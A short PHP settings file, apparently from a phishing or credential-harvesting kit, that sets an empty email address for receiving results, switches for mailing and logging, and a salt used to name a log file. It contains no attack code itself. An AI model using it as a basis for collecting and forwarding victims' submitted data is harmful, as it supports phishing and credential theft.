<?php

// ------------------------------------------------- //
  #               BY: @blue_prints                #
  #         developed by blue_prints              #
  # Change credit if you dont know how to code :) #
  #################################################
// -------------------------------------------------//

//important details
$emailzz = ""; // your email
$d_log = "on";
$salt = "87Sdd12"; // File name to secure logs
$mailpge = "on"; // to save txt file
$savetxt = "on";  // to save text file
?>